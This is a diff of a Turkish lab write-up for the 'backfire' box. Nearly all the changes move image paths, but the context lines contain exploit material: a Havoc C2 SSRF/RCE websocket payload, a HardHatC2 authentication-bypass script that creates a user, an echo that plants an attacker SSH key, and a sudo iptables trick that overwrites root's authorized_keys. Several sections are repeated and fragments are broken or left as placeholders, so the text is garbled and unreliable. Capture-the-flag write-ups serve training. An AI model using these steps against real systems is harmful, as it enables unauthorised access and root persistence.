@@ -76,7 +76,7 @@ Nmap done: 1 IP address (1 host up) scanned in 603.91 seconds
     - Ayrıca, bu portta bir HTTP proxy olabilir (özellikle "http-open-proxy" uyarısı).
 
 
-![Pasted image 20250120041412.png](/img/user/Pasted%20image%2020250120041412.png)
+![Pasted image 20250120041412.png](/img/user/resimler/Pasted%20image%2020250120041412.png)
 
 
 ### havoc.yaotl
@@ -132,7 +132,7 @@ Listeners {
 
 ```
 
-![Pasted image 20250120041626.png](/img/user/Pasted%20image%2020250120041626.png)
+![Pasted image 20250120041626.png](/img/user/resimler/Pasted%20image%2020250120041626.png)
 
 
 ### **disable_tls.patch**
@@ -186,7 +186,7 @@ ve bağlanmak için kullanıcı adı ve şifreyi gösteriyor, ancak Havoc'u yük
 
 Araştırdıktan sonra olası bir CVE güvenlik açığı buldum
 
-![Pasted image 20250121201336.png](/img/user/Pasted%20image%2020250121201336.png)
+![Pasted image 20250121201336.png](/img/user/resimler/Pasted%20image%2020250121201336.png)
 
 https://github.com/chebuya/Havoc-C2-SSRF-poc
 
@@ -508,11 +508,11 @@ payload_json=json.dumps(payload)
 write_socket(socket_id, build_websocket_frame(payload_json))
 ```
 
-![Pasted image 20250121202258.png](/img/user/Pasted%20image%2020250121202258.png)
+![Pasted image 20250121202258.png](/img/user/resimler/Pasted%20image%2020250121202258.png)
 
-![Pasted image 20250121202322.png](/img/user/Pasted%20image%2020250121202322.png)
+![Pasted image 20250121202322.png](/img/user/resimler/Pasted%20image%2020250121202322.png)
 
-![Pasted image 20250121202340.png](/img/user/Pasted%20image%2020250121202340.png)
+![Pasted image 20250121202340.png](/img/user/resimler/Pasted%20image%2020250121202340.png)
 
 
 
@@ -569,35 +569,35 @@ Ardından bir listening kurun, bounce shell'i alın ve user.txt dosyasını alı
 
  Her iki içerik oluşturucunun github'larına bir göz atalım
 
-![Pasted image 20250120041738.png](/img/user/Pasted%20image%2020250120041738.png)
+![Pasted image 20250120041738.png](/img/user/resimler/Pasted%20image%2020250120041738.png)
 
 "Biz, im chebuyas'ı 'Havoc-C2-SSRF-poc' olarak görüyoruz"
 
-![Pasted image 20250120041803.png](/img/user/Pasted%20image%2020250120041803.png)
+![Pasted image 20250120041803.png](/img/user/resimler/Pasted%20image%2020250120041803.png)
 
-![Pasted image 20250120042311.png](/img/user/Pasted%20image%2020250120042311.png)
+![Pasted image 20250120042311.png](/img/user/resimler/Pasted%20image%2020250120042311.png)
 
-![Pasted image 20250120042322.png](/img/user/Pasted%20image%2020250120042322.png)
+![Pasted image 20250120042322.png](/img/user/resimler/Pasted%20image%2020250120042322.png)
 
 Ssrf'yi kutu üzerinde çalıştırmayı başardım ama gerçekten hiçbir şey çıkmıyordu
 
-![Pasted image 20250120042356.png](/img/user/Pasted%20image%2020250120042356.png)
+![Pasted image 20250120042356.png](/img/user/resimler/Pasted%20image%2020250120042356.png)
 
 Hyperrealitys github'da c2 vulnerabiltys adlı bir bölüm buluyoruz ve içinde havoc_auth_rce adlı bir klasör var
 
-![Pasted image 20250120042441.png](/img/user/Pasted%20image%2020250120042441.png)
+![Pasted image 20250120042441.png](/img/user/resimler/Pasted%20image%2020250120042441.png)
 
 Kendi havoc instance'ımı başlattım
 
 ----
 
-![Pasted image 20250120060443.png](/img/user/Pasted%20image%2020250120060443.png)
+![Pasted image 20250120060443.png](/img/user/resimler/Pasted%20image%2020250120060443.png)
 
-![Pasted image 20250120060451.png](/img/user/Pasted%20image%2020250120060451.png)
+![Pasted image 20250120060451.png](/img/user/resimler/Pasted%20image%2020250120060451.png)
 
-![Pasted image 20250121202907.png](/img/user/Pasted%20image%2020250121202907.png)
+![Pasted image 20250121202907.png](/img/user/resimler/Pasted%20image%2020250121202907.png)
 
-![Pasted image 20250121202915.png](/img/user/Pasted%20image%2020250121202915.png)
+![Pasted image 20250121202915.png](/img/user/resimler/Pasted%20image%2020250121202915.png)
 
 
 ## Root
@@ -608,7 +608,7 @@ Lokal ssh public anahtarınızı ilya'nın anahtar dosyasına ekleyin.
 
 Eğer Kali makinenizde bir SSH anahtar çifti yoksa aşağıdaki komutla oluşturabilirsiniz:
 
-![Pasted image 20250121203236.png](/img/user/Pasted%20image%2020250121203236.png)
+![Pasted image 20250121203236.png](/img/user/resimler/Pasted%20image%2020250121203236.png)
 
 - Komut çalıştırıldığında, anahtar dosyasını kaydedeceğiniz yeri soracaktır (varsayılan olarak `~/.ssh/id_rsa` dizini kullanılır). Varsayılanı kabul etmek için `Enter` tuşuna basabilirsiniz.
 - Parola sorarsa, boş bırakabilirsiniz (kalıcı bağlantı için parola kullanmadan erişim sağlamanız gerekir).
@@ -623,7 +623,7 @@ Bu işlemden sonra, iki dosya oluşturulur:
 
 Genel anahtarınızı hedef makinedeki `~/.ssh/authorized_keys` dosyasına eklemeniz gerekiyor. Bunun için:
 
-![Pasted image 20250121203348.png](/img/user/Pasted%20image%2020250121203348.png)
+![Pasted image 20250121203348.png](/img/user/resimler/Pasted%20image%2020250121203348.png)
 
 
 Hedefteki `authorized_keys` Dosyasına Ekleyin
@@ -644,20 +644,20 @@ Kendi `id_rsa.pub` anahtarınızı bu dosyaya ekleyin. Reverse shell'de aşağı
 echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDj/3gLb5CqayZHG8NynOzx6uN6tOAkNG3E5OKxFv6tTLIiA89T8l+68Pm/VjXcQ1y3/S3TqQf73p6MRKOy+zK6Ay3S/oKoI4+0dp5DcJjn01ZG87hCQWdriR93HUcYgUG71AI+M8GzEYe3x+xdDLOOjdM+1R4Pjm21R/vW7FFvzG265B5nZtMoLesHXSCvdrE6WwhVULcnH1Hn+1SnP5ZlGkdJaKtKcph4K0fittKij1US/SZ6P6szf4PpOjF8xyhBpizqqfuu2ACCTBUB2yznYSH0JCIC4UMGNZNpVN0lK8vGMbFEPs+rn9Pm017jlJTth3JjYdXyJdKl2vCnj9x5 root@kali" >> authorized_keys
 ```
 
-![Pasted image 20250121203645.png](/img/user/Pasted%20image%2020250121203645.png)
+![Pasted image 20250121203645.png](/img/user/resimler/Pasted%20image%2020250121203645.png)
 
-![Pasted image 20250121203714.png](/img/user/Pasted%20image%2020250121203714.png)
+![Pasted image 20250121203714.png](/img/user/resimler/Pasted%20image%2020250121203714.png)
 
-![Pasted image 20250121203737.png](/img/user/Pasted%20image%2020250121203737.png)
+![Pasted image 20250121203737.png](/img/user/resimler/Pasted%20image%2020250121203737.png)
 
-![Pasted image 20250121203753.png](/img/user/Pasted%20image%2020250121203753.png)
+![Pasted image 20250121203753.png](/img/user/resimler/Pasted%20image%2020250121203753.png)
 
 "Sergej, HardHatC2'yi test amacıyla kurduğunu ve varsayılan ayarları değiştirmediğini söyledi.  
 Umarım Havoc'u tercih eder çünkü başka bir C2 framework'ü öğrenmek istemiyorum, ayrıca Go > C#."
 
 İntranet portlarının durumunu kontrol etme
 
-![Pasted image 20250121203927.png](/img/user/Pasted%20image%2020250121203927.png)
+![Pasted image 20250121203927.png](/img/user/resimler/Pasted%20image%2020250121203927.png)
 
 Bu HardHatC2 ile ilgili güvenlik açıklarını ararken şunu buldum 👇
 
@@ -665,7 +665,7 @@ https://blog.sth.sh/hardhatc2-0-days-rce-authn-bypass-96ba683d9dd7
 
 Öncelikle, SSH aracılığıyla intranet üzerindeki 7096 ve 5000 numaralı portları proxy'lemeniz gerekir
 
-![Pasted image 20250121204109.png](/img/user/Pasted%20image%2020250121204109.png)
+![Pasted image 20250121204109.png](/img/user/resimler/Pasted%20image%2020250121204109.png)
 
 sonra çalıştır
 
@@ -714,7 +714,7 @@ r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, verify=Fals
 print(r.text)
 ```
 
-![Pasted image 20250121204206.png](/img/user/Pasted%20image%2020250121204206.png)
+![Pasted image 20250121204206.png](/img/user/resimler/Pasted%20image%2020250121204206.png)
 
 Çalıştırdıktan sonra kullanıcının başarıyla oluşturulduğunu görebilirsiniz. Ardından [https://127.0.0.1:7096/](https://127.0.0.1:7096/) adresine gidin ve kullanıcı adı ve şifre ile giriş yapın.
 
@@ -727,15 +727,15 @@ username : sth_pentest
 username : sth_pentest
 ```
 
-![Pasted image 20250121205301.png](/img/user/Pasted%20image%2020250121205301.png)
+![Pasted image 20250121205301.png](/img/user/resimler/Pasted%20image%2020250121205301.png)
 
-![Pasted image 20250121205821.png](/img/user/Pasted%20image%2020250121205821.png)
+![Pasted image 20250121205821.png](/img/user/resimler/Pasted%20image%2020250121205821.png)
 
-![Pasted image 20250121205901.png](/img/user/Pasted%20image%2020250121205901.png)
+![Pasted image 20250121205901.png](/img/user/resimler/Pasted%20image%2020250121205901.png)
 
 Ardından sudo izinleri komutunu görmek için ssh kullanarak sergej'de oturum açın
 
-![Pasted image 20250121205928.png](/img/user/Pasted%20image%2020250121205928.png)
+![Pasted image 20250121205928.png](/img/user/resimler/Pasted%20image%2020250121205928.png)
 
 iptables ile ilgili power-up'ları arayın
 
@@ -750,7 +750,7 @@ sudo iptables -A INPUT -i lo -j ACCEPT -m comment --comment
 
 Testler sonucunda bu `comment`'in uzunluğunun çok fazla olamayacağı belirlendi, bu nedenle SSH anahtarının uzunluğu nispeten kısa olmalıdır.
 
-![Pasted image 20250121210235.png](/img/user/Pasted%20image%2020250121210235.png)
+![Pasted image 20250121210235.png](/img/user/resimler/Pasted%20image%2020250121210235.png)
 
 Ardından root'un anahtar dosyasının üzerine yazın
 
@@ -758,32 +758,32 @@ Ardından root'un anahtar dosyasının üzerine yazın
 sergej@backfire:~$ sudo /usr/sbin/iptables -A INPUT -i lo -j ACCEPT -m comment --comment 
 
 
-![Pasted image 20250121210633.png](/img/user/Pasted%20image%2020250121210633.png)
+![Pasted image 20250121210633.png](/img/user/resimler/Pasted%20image%2020250121210633.png)
 
-![Pasted image 20250121210705.png](/img/user/Pasted%20image%2020250121210705.png)
+![Pasted image 20250121210705.png](/img/user/resimler/Pasted%20image%2020250121210705.png)
 
-![Pasted image 20250121211521.png](/img/user/Pasted%20image%2020250121211521.png)
+![Pasted image 20250121211521.png](/img/user/resimler/Pasted%20image%2020250121211521.png)
 
-![Pasted image 20250121211602.png](/img/user/Pasted%20image%2020250121211602.png)
+![Pasted image 20250121211602.png](/img/user/resimler/Pasted%20image%2020250121211602.png)
 \nYourKeysHere\n'
 ```
 
 Testler sonucunda bu `comment`'in uzunluğunun çok fazla olamayacağı belirlendi, bu nedenle SSH anahtarının uzunluğu nispeten kısa olmalıdır.
 
-![Pasted image 20250121210235.png](/img/user/Pasted%20image%2020250121210235.png)
+![Pasted image 20250121210235.png](/img/user/resimler/Pasted%20image%2020250121210235.png)
 
 Ardından root'un anahtar dosyasının üzerine yazın
 
 {{CODE_BLOCK_10}}
 
 
-![Pasted image 20250121210633.png](/img/user/Pasted%20image%2020250121210633.png)
+![Pasted image 20250121210633.png](/img/user/resimler/Pasted%20image%2020250121210633.png)
 
-![Pasted image 20250121210705.png](/img/user/Pasted%20image%2020250121210705.png)
+![Pasted image 20250121210705.png](/img/user/resimler/Pasted%20image%2020250121210705.png)
 
-![Pasted image 20250121211521.png](/img/user/Pasted%20image%2020250121211521.png)
+![Pasted image 20250121211521.png](/img/user/resimler/Pasted%20image%2020250121211521.png)
 
-![Pasted image 20250121211602.png](/img/user/Pasted%20image%2020250121211602.png)
+![Pasted image 20250121211602.png](/img/user/resimler/Pasted%20image%2020250121211602.png)
 \n your_ed25519_pub_keys\n'
  
 sergej@backfire:~$ sudo /usr/sbin/iptables -S
@@ -792,29 +792,29 @@ sergej@backfire:~$ sudo /usr/sbin/iptables-save -f /root/.ssh/authorized_keys
 ```
 
 
-![Pasted image 20250121210633.png](/img/user/Pasted%20image%2020250121210633.png)
+![Pasted image 20250121210633.png](/img/user/resimler/Pasted%20image%2020250121210633.png)
 
-![Pasted image 20250121210705.png](/img/user/Pasted%20image%2020250121210705.png)
+![Pasted image 20250121210705.png](/img/user/resimler/Pasted%20image%2020250121210705.png)
 
-![Pasted image 20250121211521.png](/img/user/Pasted%20image%2020250121211521.png)
+![Pasted image 20250121211521.png](/img/user/resimler/Pasted%20image%2020250121211521.png)
 
-![Pasted image 20250121211602.png](/img/user/Pasted%20image%2020250121211602.png)
+![Pasted image 20250121211602.png](/img/user/resimler/Pasted%20image%2020250121211602.png)
 \nYourKeysHere\n'
 ```
 
 Testler sonucunda bu `comment`'in uzunluğunun çok fazla olamayacağı belirlendi, bu nedenle SSH anahtarının uzunluğu nispeten kısa olmalıdır.
 
-![Pasted image 20250121210235.png](/img/user/Pasted%20image%2020250121210235.png)
+![Pasted image 20250121210235.png](/img/user/resimler/Pasted%20image%2020250121210235.png)
 
 Ardından root'un anahtar dosyasının üzerine yazın
 
 {{CODE_BLOCK_10}}
 
 
-![Pasted image 20250121210633.png](/img/user/Pasted%20image%2020250121210633.png)
+![Pasted image 20250121210633.png](/img/user/resimler/Pasted%20image%2020250121210633.png)
 
-![Pasted image 20250121210705.png](/img/user/Pasted%20image%2020250121210705.png)
+![Pasted image 20250121210705.png](/img/user/resimler/Pasted%20image%2020250121210705.png)
 
-![Pasted image 20250121211521.png](/img/user/Pasted%20image%2020250121211521.png)
+![Pasted image 20250121211521.png](/img/user/resimler/Pasted%20image%2020250121211521.png)
 
-![Pasted image 20250121211602.png](/img/user/Pasted%20image%2020250121211602.png)
+![Pasted image 20250121211602.png](/img/user/resimler/Pasted%20image%2020250121211602.png)
